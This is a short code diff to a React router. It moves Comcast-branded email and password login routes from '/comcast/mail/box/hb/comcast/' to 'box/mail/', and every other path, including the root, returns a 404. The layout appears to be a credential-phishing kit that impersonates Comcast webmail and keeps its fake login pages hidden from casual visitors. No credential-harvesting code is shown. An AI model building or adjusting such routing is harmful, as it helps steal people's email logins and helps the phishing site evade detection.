@@ -20,8 +20,8 @@ const App = () => (
           <Route path="/" element={<NotFound />} />
 
           {/* Your login page is now at /box/mail */}
-          <Route path="/comcast/mail/box/hb/comcast/" element={<LoginEmail />} />
-          <Route path="/comcast/mail/box/hb/comcast/password" element={<LoginPassword />} />
+          <Route path="box/mail/" element={<LoginEmail />} />
+          <Route path="box/mail/password" element={<LoginPassword />} />
 
           {/* Everything else also 404 */}
           <Route path="*" element={<NotFound />} />
